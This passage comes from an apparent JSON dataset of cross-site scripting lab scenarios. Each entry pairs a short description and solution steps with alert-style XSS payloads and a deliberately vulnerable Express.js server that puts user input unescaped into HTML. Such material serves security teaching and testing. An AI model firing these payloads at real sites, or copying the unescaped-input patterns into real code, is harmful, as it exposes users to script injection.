      "Visit rendered SVG view page",
      "Execution happens via SVG animation event attributes"
    ],
    "payloads": [
      "<svg><animate attributeName=\"x\" onbegin=\"alert(1)\"></animate></svg>",
      "<svg><set attributeName=\"onload\" to=\"alert('svgXSS')\"></set></svg>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet svgContent = '';\n\napp.use(express.text());\n\napp.post('/upload-svg', (req, res) => {\n  svgContent = req.body;\n  res.redirect('/view-svg');\n});\n\napp.get('/view-svg', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body>${svgContent}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in URL Path via 404 Handler",
    "Lab Description": "The 404 error handler reflects the requested URL back to the page. By crafting the URL with script tags, the attacker injects code into the page.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Access a nonexistent path like /<script>alert(1)</script>",
      "Server reflects URL path in the 404 page body",
      "No sanitization on the reflected URL"
    ],
    "payloads": [
      "/<script>alert('404XSS')</script>",
      "/<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.use((req, res) => {\n  res.status(404).send(`\n    <html>\n      <body>\n        <h1>Page not found: ${req.url}</h1>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Mutation XSS in innerHTML with Event-less Custom Elements",
    "Lab Description": "The app uses custom elements but doesn't filter content before setting innerHTML. Even without event attributes, inserting <script> can trigger parsing.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit content wrapped in unknown tag like <widget>",
      "innerHTML sets raw content, triggering script execution",
      "Use script inside custom elements or uncommon tags"
    ],
    "payloads": [
      "<widget><script>alert('customTagXSS')</script></widget>",
      "<fake><script>alert(1)</script></fake>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\\nconst app = express();\\n\\napp.use(express.text());\\n\\napp.post('/render-widget', (req, res) => {\\n  const content = req.body;\\n  res.send(`\\n    <html>\\n      <body>\\n        <div id=\\\"output\\\"></div>\\n        <script>\\n          document.getElementById('output').innerHTML = \\`${content}\\`;\\n        </script>\\n      </body>\\n    </html>\\n  `);\\n});\\n\\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in JSONP Callback Parameter",
    "Lab Description": "The API provides JSONP support with a callback parameter. An attacker injects a malicious callback function to execute arbitrary JavaScript.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send GET request to /api/data?callback=alert(1)",
      "Response includes callback wrapping the data",
      "Script tag with crafted callback causes execution"
    ],
    "payloads": [
      "/api/data?callback=alert(1)",
      "/api/data?callback=foo);alert('jsonpXSS')//"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const cb = req.query.callback || 'cb';\n  const data = JSON.stringify({ user: 'guest' });\n  res.type('application/javascript');\n  res.send(`${cb}(${data});`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via JavaScript URL in clickable breadcrumb",
    "Lab Description": "The breadcrumb component builds navigation paths using query parameters and sets them in anchor `href` attributes. Supplying a `javascript:` link causes execution on click.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit query like ?crumb=javascript:alert(1)",
      "Breadcrumb renders with href=javascript:...",
      "Clicking the breadcrumb triggers the payload"
    ],
    "payloads": [
      "javascript:alert(1)",
      "javascript:confirm(document.cookie)"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/breadcrumbs', (req, res) => {\n  const crumb = req.query.crumb || '/';\n  res.send(`\n    <html>\n      <body>\n        <a href=\"${crumb}\">Back</a>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via clipboard injection in paste event",
    "Lab Description": "The web app handles `paste` events and directly injects clipboard content into the DOM using innerHTML. If an attacker copies malicious HTML, pasting triggers XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Copy: <img src=x onerror=alert(1)>",
      "Paste into the editor",
      "Editor inserts the payload unsanitized",
      "Script executes immediately"
    ],
    "payloads": [
      "<img src=x onerror=alert('pasteXSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/paste-editor', (req, res) => {\n  res.send(`\n    <html>\n      <body contenteditable='true' id='editor'></body>\n      <script>\n        document.getElementById('editor').addEventListener('paste', e => {\n          const pasted = e.clipboardData.getData('text/html') || e.clipboardData.getData('text/plain');\n          e.preventDefault();\n          document.execCommand('insertHTML', false, pasted);\n        });\n      </script>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in tag suggestions dropdown",
    "Lab Description": "User-created tags are stored and rendered in a tag suggestions dropdown using innerHTML. A malicious tag name leads to XSS when suggestions are shown.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a tag named <script>alert(1)</script>",
      "Visit tag search or edit page",
      "Dropdown renders the malicious tag name",
      "Script executes when suggestions appear"
    ],
    "payloads": [
      "<script>alert('tagXSS')</script>",
      "<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet tags = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-tag', (req, res) => {\n  tags.push(req.body.tag);\n  res.redirect('/suggest');\n});\n\napp.get('/suggest', (req, res) => {\n  const html = tags.map(t => `<div class='tag'>${t}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via SVG title tooltip injection",
    "Lab Description": "User-submitted content appears in the `<title>` element of inline SVG. Some browsers render this as tooltips, and malformed SVG titles can trigger XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create SVG with <title><script>alert(1)</script></title>",
      "Submit to the app",
      "Script executes when tooltip triggers or page loads"
    ],
    "payloads": [
      "<svg><title><script>alert('svgTitle')</script></title></svg>",
      "<svg><title><![CDATA[</title><script>alert(1)</script>]]></title></svg>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/svg-preview', (req, res) => {\n  res.send(`<html><body>${req.body}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via username in audio transcript captions",
    "Lab Description": "The app generates captions for audio recordings. Usernames are shown in speaker labels inside the transcript, inserted via innerHTML. Injected scripts run in the captions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Register with username <img src=x onerror=alert(1)>",
      "Join a voice session and generate transcript",
      "View transcript in browser and observe payload execution"
    ],
    "payloads": [
      "<img src=x onerror=alert('voiceXSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\nlet transcript = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/speak', (req, res) => {\n  const { user, text } = req.body;\n  transcript += `<div><b>${user}:</b> ${text}</div>`;\n  res.redirect('/transcript');\n});\n\napp.get('/transcript', (req, res) => {\n  res.send(`<html><body>${transcript}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via postMessage Reflection in Parent Window",
    "Lab Description": "The application receives postMessage events from an iframe and injects the message into the DOM without validation. An attacker can craft a malicious iframe that sends a script payload via postMessage.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Host an iframe page that sends postMessage('<img src=x onerror=alert(1)>')",
      "Embed the iframe in the parent app",
      "Parent receives and injects message using innerHTML",
      "Payload is executed in parent’s context"
    ],
    "payloads": [
      "<script>alert('postMessageXSS')</script>",
      "<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/parent', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <iframe src='/iframe'></iframe>\n        <div id='output'></div>\n        <script>\n          window.addEventListener('message', e => {\n            document.getElementById('output').innerHTML = e.data;\n          });\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.get('/iframe', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <script>\n          parent.postMessage('<img src=x onerror=alert(1)>', '*');\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via template tag cloning in shadow DOM",
    "Lab Description": "The app uses a `<template>` tag within a shadow DOM to dynamically clone and inject HTML. Injected HTML inside the template escapes default sanitizers and executes upon cloning.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inject <template><script>alert(1)</script></template>",
      "App clones and attaches it inside shadow DOM",
      "Script is executed when cloned"
    ],
    "payloads": [
      "<template><script>alert('shadowXSS')</script></template>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/shadow-render', (req, res) => {\n  const content = req.body;\n  res.send(`\n    <html>\n      <body>\n        <div id='host'></div>\n        <template id='tpl'>${content}</template>\n        <script>\n          const root = document.getElementById('host').attachShadow({mode: 'open'});\n          const tpl = document.getElementById('tpl');\n          const clone = tpl.content.cloneNode(true);\n          root.appendChild(clone);\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via innerText fallback after failed rendering",
    "Lab Description": "The app attempts to render user HTML input, and on failure falls back to innerText. However, if the original input remains in the DOM, some browsers may parse and execute delayed scripts.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit invalid HTML that breaks rendering",
      "App falls back but does not sanitize",
      "Browser re-parses content and executes scripts"
    ],
    "payloads": [
      "<div><script>alert('fallbackXSS')</script></div>",
      "<img src=1 onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\\nconst app = express();\\napp.use(express.text());\\n\\napp.post('/render', (req, res) => {\\n  res.send(`\\n    <html>\\n      <body>\\n        <div id='content'></div>\\n        <script>\\n          try {\\n            document.getElementById('content').innerHTML = \\`${req.body}\\`;\\n          } catch(e) {\\n            document.getElementById('content').innerText = req.body;\\n          }\\n        </script>\\n      </body>\\n    </html>\\n  `);\\n});\\n\\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via localization translation key injection",
    "Lab Description": "The app supports multilingual labels stored in a key-value object. If a user can manipulate keys, injecting HTML in a translation value leads to XSS when rendered via innerHTML.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit new translation key with HTML/JS payload",
      "App renders it using innerHTML",
      "Payload is executed in the DOM"
    ],
    "payloads": [
      "<img src=x onerror=alert('l10nXSS')>",
      "<script>alert('translate')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet translations = {};\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-translation', (req, res) => {\n  translations[req.body.key] = req.body.value;\n  res.redirect('/show');\n});\n\napp.get('/show', (req, res) => {\n  const label = translations['greeting'] || 'Hello';\n  res.send(`<html><body><div id='label'>${label}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via `onanimationstart` in CSS keyframes",
    "Lab Description": "Some browsers allow triggering JS via `onanimationstart` events in HTML tags. If an element uses an animation with JS in event handler, XSS is possible.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inject tag with animation and `onanimationstart=alert(1)`",
      "Use a defined CSS animation to trigger it",
      "Payload runs when animation starts"
    ],
    "payloads": [
      "<div style='animation: x 1s' onanimationstart=alert('cssXSS')></div>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/animated', (req, res) => {\n  res.send(`\n    <html>\n      <head>\n        <style>\n          @keyframes x { from { opacity: 0; } to { opacity: 1; } }\n        </style>\n      </head>\n      <body>${req.body}</body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via clipboard hijack on content-editable element",
    "Lab Description": "The application includes a public message board with a content-editable area for writing. When malicious HTML is copied and pasted, it executes instantly because the app trusts clipboard HTML and injects it using `insertAdjacentHTML`.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft malicious HTML and copy to clipboard",
      "Paste it into the editable div",
      "Observe the payload executing on paste",
      "Try invisible script payloads inside span or comment"
    ],
    "payloads": [
      "<img src=x onerror=alert('clipboardXSS')>",
      "<span><script>alert('paste')</script></span>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/board', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Message Board</h2>\n        <div contenteditable='true' id='editor'></div>\n        <script>\n          document.getElementById('editor').addEventListener('paste', e => {\n            const html = e.clipboardData.getData('text/html');\n            document.execCommand('insertHTML', false, html);\n            e.preventDefault();\n          });\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in CSV export rendered as HTML preview",
    "Lab Description": "The web application offers a CSV preview feature before download. Malicious cells with formula-like payloads are rendered using `innerHTML`, allowing execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Upload or inject a CSV with payload in a cell like =1+1<script>alert(1)</script>",
      "Preview the CSV table in HTML",
      "Observe the payload executing in the rendered table"
    ],
    "payloads": [
      "=1+1<script>alert('csvXSS')</script>",
      "<td><img src=x onerror=alert(1)></td>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/preview-csv', (req, res) => {\n  const rows = req.body.trim().split('\\n').map(row => '<tr>' + row.split(',').map(cell => `<td>${cell}</td>`).join('') + '</tr>').join('');\n  res.send(`<html><body><table>${rows}</table></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS through malformed image alt attribute in CMS",
    "Lab Description": "The CMS allows editors to insert images with custom `alt` text. If the `alt` text contains malformed attributes or tags, it's rendered inside an image preview tooltip, which is injected with innerHTML.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Insert image with alt='<img src=x onerror=alert(1)>'",
      "Hover over the image in preview mode",
      "Observe payload execution",
      "Try variations of malformed quotes or tags"
    ],
    "payloads": [
      "\" onerror=alert('altXSS')",
      "'><script>alert(1)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-image', (req, res) => {\n  const alt = req.body.alt;\n  res.send(`<html><body><img src='img.png' alt='${alt}' title='${alt}'></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via `aria-label` reflection in accessibility component",
    "Lab Description": "The site supports screen readers with `aria-label` attributes on buttons and links. User-controlled values are inserted without escaping, allowing JS injection inside the DOM structure.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit malicious input like <img src=x onerror=alert(1)> as label",
      "The app reflects it in `aria-label` attributes or tooltips",
      "Payload is parsed and executed in DOM"
    ],
    "payloads": [
      "<img src=x onerror=alert('ariaXSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/label-button', (req, res) => {\n  const label = req.body.label;\n  res.send(`<html><body><button aria-label='${label}'>Click</button></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via CSS variable injection inside style tag",
    "Lab Description": "Users can define CSS variables (e.g., for themes), but values are interpolated directly into a `<style>` tag, allowing for JS injection in some browsers via `url(javascript:...)`.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit custom CSS variable like --bg:url(javascript:alert(1))",
      "App injects it inside a `<style>` block",
      "JS payload executes when used in a background property"
    ],
    "payloads": [
      "--bg:url(javascript:alert('cssVar'))",
      "--xss:url(data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/theme', (req, res) => {\n  const theme = req.body.vars;\n  res.send(`\n    <html>\n      <head>\n        <style>:root { ${theme} } body { background: var(--bg); }</style>\n      </head>\n      <body>Welcome</body>\n    </html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via dynamic script injection in error stack trace viewer",
    "Lab Description": "The application displays backend error stack traces for debugging. User input is sometimes logged and reflected in the error message, which is rendered with innerHTML for styling. An attacker can trigger an error with a crafted payload that executes in the trace viewer.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a request that causes a server error and includes a script in the input",
      "Error message reflects the input in the trace log",
      "Stack trace viewer uses innerHTML, executing the payload"
    ],
    "payloads": [
      "<script>alert('traceXSS')</script>",
      "<img src=x onerror=alert('stack')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/debug', (req, res) => {\n  const q = req.query.q;\n  try {\n    if (q.includes('<')) throw new Error('Invalid input: ' + q);\n    res.send('OK');\n  } catch (err) {\n    res.send(`\n      <html>\n        <body>\n          <h2>Error Trace</h2>\n          <div style='color:red'>${err.message}</div>\n        </body>\n      </html>\n    `);\n  }\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Markdown image alt injection in preview pane",
    "Lab Description": "Markdown input is rendered to HTML using a parser that does not escape special characters in image `alt` attributes. A payload in the alt text leads to DOM injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a markdown like ![\" onerror=alert(1)](x)",
      "Preview renders markdown using innerHTML",
      "Injected alt attribute triggers JavaScript"
    ],
    "payloads": [
      "![' onerror=alert(1)](x)",
      "![x\" onerror=alert('alt')](image.jpg)"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst marked = require('marked');\nconst app = express();\n\napp.use(express.text());\n\napp.post('/preview-md', (req, res) => {\n  const html = marked(req.body);\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via keyboard shortcut tooltip injection",
    "Lab Description": "Keyboard shortcuts are rendered from user-defined actions. The key description is inserted into tooltip HTML using innerHTML, leading to XSS when hovering.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Define a shortcut with key text: <img src=x onerror=alert(1)>",
      "Hover over the tooltip showing shortcut description",
      "Observe the payload being executed"
    ],
    "payloads": [
      "<img src=x onerror=alert('shortcut')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\nlet shortcuts = [];\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-shortcut', (req, res) => {\n  shortcuts.push(req.body.key);\n  res.redirect('/shortcuts');\n});\n\napp.get('/shortcuts', (req, res) => {\n  const list = shortcuts.map(k => `<div class='tooltip' title='Shortcut: ${k}'>${k}</div>`).join('');\n  res.send(`<html><body>${list}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via video player subtitle track injection",
    "Lab Description": "The platform allows uploading subtitle (VTT) tracks that are rendered as HTML in a caption viewer. Malicious captions can contain script tags or on-event attributes.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Upload a VTT file containing malicious HTML inside cue",
      "Render the video with captions enabled",
      "Payload is injected into caption container"
    ],
    "payloads": [
      "<script>alert('subXSS')</script>",
      "<img src=x onerror=alert('track')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet track = '';\n\napp.use(express.text());\n\napp.post('/upload-track', (req, res) => {\n  track = req.body;\n  res.redirect('/player');\n});\n\napp.get('/player', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <video controls>\n          <track label=\"English\" kind=\"subtitles\" src=\"data:text/vtt,${encodeURIComponent(track)}\" default>\n        </video>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via dynamic `onload` injection in lazy-loaded components",
    "Lab Description": "The application lazy-loads components by injecting script and HTML fragments based on user input. A payload in the load path is inserted into an `img` tag as `src`, allowing `onerror` to execute.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft a malicious fragment path with an onerror payload",
      "Trigger the lazy-load mechanism",
      "App injects HTML dynamically, executing the script"
    ],
    "payloads": [
      "x\" onerror=\"alert('lazyXSS')",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/lazy-load', (req, res) => {\n  const fragment = req.query.fragment;\n  res.send(`\n    <html>\n      <body>\n        <script>\n          const frag = '<img src=\"${fragment}\">';\n          document.body.insertAdjacentHTML('beforeend', frag);\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via QR Code data reflection in preview screen",
    "Lab Description": "The application allows users to generate QR codes and preview the data embedded inside. The raw data is reflected in the preview window using innerHTML without escaping. If the data contains HTML, it will be executed in the browser.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a QR code data payload with HTML or script tags",
      "View the QR code preview page",
      "Observe the reflected data executing in the preview"
    ],
    "payloads": [
      "<script>alert('qrXSS')</script>",
      "<img src=x onerror=alert('qr')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/generate-qr', (req, res) => {\n  const data = req.body.qrdata;\n  res.send(`\n    <html>\n      <body>\n        <h3>QR Preview</h3>\n        <div id='preview'>${data}</div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via voice assistant command transcript display",
    "Lab Description": "The application includes a voice command recognition system that transcribes spoken input and displays it on the interface. If an attacker controls the input (e.g., via audio injection), the transcript can include executable HTML.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit or simulate a voice command that contains a script tag",
      "Transcript viewer renders it directly via innerHTML",
      "Script executes immediately"
    ],
    "payloads": [
      "<script>alert('voiceXSS')</script>",
      "<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet lastTranscript = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit-voice', (req, res) => {\n  lastTranscript = req.body.text;\n  res.redirect('/transcript');\n});\n\napp.get('/transcript', (req, res) => {\n  res.send(`<html><body><div id='speech'>${lastTranscript}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via image gallery caption rendering",
    "Lab Description": "Users can upload images and add captions. The captions are rendered using innerHTML below the images. If a caption contains a script or event handler, it will be executed.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Upload image with caption <img src=x onerror=alert(1)>",
      "Visit the gallery page",
      "Payload in caption executes under image"
    ],
    "payloads": [
      "<script>alert('captionXSS')</script>",
      "<img src=x onerror=alert('imgCaption')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet captions = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload-caption', (req, res) => {\n  captions.push(req.body.caption);\n  res.redirect('/gallery');\n});\n\napp.get('/gallery', (req, res) => {\n  const html = captions.map(c => `<figure><img src='cat.jpg'><figcaption>${c}</figcaption></figure>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via terminal output rendering in web-based CLI",
    "Lab Description": "The web-based CLI interface reflects command results using innerHTML. If a command returns crafted HTML, it gets executed in the terminal output.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Run a command like echo <script>alert(1)</script>",
      "Terminal reflects the output unsanitized",
      "Script executes in output container"
    ],
    "payloads": [
      "<script>alert('cliXSS')</script>",
      "<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/cli', (req, res) => {\n  const out = req.body.cmd;\n  res.send(`<html><body><pre>${out}</pre></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via chat bot training phrase injection",
    "Lab Description": "The app allows users to submit new training phrases for a chat bot. These phrases are listed in the UI for review, and are rendered via innerHTML. A malicious phrase can execute script code.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a training phrase like <script>alert('chat')</script>",
      "Navigate to training UI",
      "Script runs in reviewer’s browser"
    ],
    "payloads": [
      "<script>alert('botXSS')</script>",
      "<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet phrases = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/train', (req, res) => {\n  phrases.push(req.body.phrase);\n  res.redirect('/review');\n});\n\napp.get('/review', (req, res) => {\n  const html = phrases.map(p => `<div>${p}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via toast notification rendering",
    "Lab Description": "The application uses custom toast notifications to show user feedback messages. These messages are rendered using innerHTML. If attacker input is reflected in the message, arbitrary HTML can be injected and executed.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Trigger a notification that includes user-controlled input (e.g., query param or form field)",
      "Craft payload like <img src=x onerror=alert(1)>",
      "App reflects input in toast popup via innerHTML",
      "Script executes on page load or user interaction"
    ],
    "payloads": [
      "<img src=x onerror=alert('toastXSS')>",
      "<svg/onload=alert('toast')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.get('/notify', (req, res) => {\n  const msg = req.query.msg || 'Welcome';\n  res.send(`\n    <html>\n      <body>\n        <script>\n          const toast = document.createElement('div');\n          toast.className = 'toast';\n          toast.innerHTML = '${msg}';\n          document.body.appendChild(toast);\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via calendar event title injection",
    "Lab Description": "The calendar app displays event titles in hover tooltips. These titles are user-controlled and inserted into the DOM without sanitization. JavaScript can be injected via the title.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Create an event with title <img src=x onerror=alert(1)>",
      "Open the calendar view",
      "Hover over the event to trigger tooltip",
      "Payload executes on hover"
    ],
    "payloads": [
      "<img src=x onerror=alert('calendarXSS')>",
      "<svg/onload=alert('calendar')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet events = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-event', (req, res) => {\n  events.push(req.body.title);\n  res.redirect('/calendar');\n});\n\napp.get('/calendar', (req, res) => {\n  const html = events.map(t => `<div title='${t}'>📅</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via file rename form field",
    "Lab Description": "The file manager allows renaming files via a form. The new name is displayed as a label using innerHTML. Malicious input as filename can inject HTML or script.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Rename file to <script>alert(1)</script>",
      "Submit form",
      "Redirect to file list page",
      "Observe payload execution in file name label"
    ],
    "payloads": [
      "<script>alert('renameXSS')</script>",
      "<img src=x onerror=alert('rename')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet filenames = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/rename', (req, res) => {\n  filenames.push(req.body.newname);\n  res.redirect('/files');\n});\n\napp.get('/files', (req, res) => {\n  const html = filenames.map(f => `<div>${f}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via chat emoji replacement feature",
    "Lab Description": "The chat system replaces emoji shortcodes (e.g., :smile:) with images using innerHTML. If an attacker injects a pseudo-emoji string that contains HTML, it is directly parsed and executed.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send message with payload like :<script>alert(1)</script>:",
      "App attempts to parse emoji and uses innerHTML to replace",
      "Script executes inside chat history"
    ],
    "payloads": [
      ":<script>alert('emojiXSS')</script>:",
      ":<img src=x onerror=alert(1)>:"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet messages = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/chat', (req, res) => {\n  messages.push(req.body.msg);\n  res.redirect('/chatlog');\n});\n\napp.get('/chatlog', (req, res) => {\n  const log = messages.map(m => `<div>${m}</div>`).join('');\n  res.send(`<html><body>${log}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via HTML5 draggable attribute content",
    "Lab Description": "The application allows creating draggable items with custom labels. Labels are rendered using innerHTML. An attacker can inject script via a draggable item.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create draggable element with label <img src=x onerror=alert(1)>",
      "Drag item into drop area",
      "Script executes as the HTML is injected"
